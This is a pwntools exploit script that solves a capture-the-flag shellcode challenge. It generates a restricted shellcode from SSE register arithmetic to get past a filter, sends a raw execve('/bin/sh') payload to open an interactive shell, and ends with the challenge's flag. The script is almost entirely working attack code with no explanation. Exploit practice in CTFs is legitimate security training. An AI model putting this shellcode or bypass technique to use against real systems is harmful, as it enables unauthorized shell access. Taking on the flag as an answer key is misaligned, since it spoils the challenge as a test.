from pwn import *

context.arch = "x86_64"

gdbscript = '''
'''

pre_argv = ["python3"]
post_argv = []


def get_conn(pre_argv, post_argv, gdbscript):
    host = args.HOST or 'localhost'
    port = int(args.PORT or 1337)
    cmd = pre_argv + ["sshellcode.py"] + post_argv
    context.terminal = 'st'

    if args.REMOTE:
        p = remote(host, port)
    else:
        p = process(cmd)

    if args.GDB:
        gdb.attach(p)

    if args.DBG:
        p = gdb.debug(cmd, gdbscript=gdbscript)

    return p


def trace(func):
    def wrapper(*args, **kwargs):
        info(f"{func.__name__} {args} {kwargs}")
        return func(*args, **kwargs)
    return wrapper


p : tube = get_conn(pre_argv, post_argv, gdbscript)
r = lambda *a, **k: p.recv(*a, **k)
rl = lambda *a, **k: p.recvline(*a, **k)
ru = lambda *a, **k: p.recvuntil(*a, **k)
rr = lambda *a, **k: p.recvregex(*a, **k)
cl = lambda *a, **k: p.clean(*a, **k)
s = lambda *a, **k: p.send(*a, **k)
sa = lambda *a, **k: p.sendafter(*a, **k)
st = lambda *a, **k: p.sendthen(*a, **k)
sl = lambda *a, **k: p.sendline(*a, **k)
sla = lambda *a, **k: p.sendlineafter(*a, **k)
slt = lambda *a, **k: p.sendlinethen(*a, **k)
ia = lambda *a, **k: p.interactive(*a, **k)

ptr_protect = lambda pos, ptr: ptr ^ (pos >> 12)
ptr_mangle = lambda ptr, grd: rol(ptr ^ grd, 0x11)
ptr_demangle = lambda ptr, grd: ror(ptr, 0x11) ^ grd
i2b = lambda i: str(i).encode()


ADDR = 0x13370000

def find_value(val):
    st = 0
    while (ADDR << st) < val:
        st += 1
    st -= 1

    arr = []
    res = ADDR << st
    i = st
    while res != val:
        d = ADDR << i if i >= 0 else ADDR >> (-i)
        if res + d > val:
            i -= 1
        else:
            res += d
            arr.append(i)

    return st, arr


code = '''
xorps xmm1, xmm1
movq rdi, xmm1
movq xmm0, r11
movq rsi, xmm0
psllq xmm0, 6
paddq xmm1, xmm0
'''

st, arr = find_value(0x50fc03148)

for i in arr:
    df = st - i
    if df != 0:
        code += f"psrlq xmm0, {df}\npaddq xmm1, xmm0\n"
    else:
        code += "paddq xmm1, xmm0\n"
    if i == -17:
        code += "movq rdx, xmm0\n"
    st = i

code += '''
movq rbx, xmm1
movq xmm0, r11
movq xmm1, xmm0
'''

st, arr = find_value(0x13370153)

for i in arr:
    df = st - i
    if df != 0:
        code += f"psrlq xmm0, {df}\npaddq xmm1, xmm0\n"
    st = i

code += '''
movq rax, xmm1
psrlq xmm0, 2
paddq xmm1, xmm0
psllq xmm0, 3
paddq xmm1, xmm0
movq rsp, xmm1
'''

for _ in range(17):
    code += "movq xmm1, r10\n"
for _ in range(4):
    code += "xorps xmm2, xmm2\n"

sc = asm(code)
sl(sc.hex().encode())

# execve("/bin/sh", 0, 0) - shellcode
new_sc = b"A" * 0x159 + b"\x31\xc0\x48\xbb\xd1\x9d\x96\x91\xd0\x8c\x97\xff\x48\xf7\xdb\x53\x54\x5f\x99\x52\x57\x54\x5e\xb0\x3b\x0f\x05"
pause()
s(new_sc)

ia()

# L3AK{n0n_m3m0ry_55h3llc0d3_15_6r347}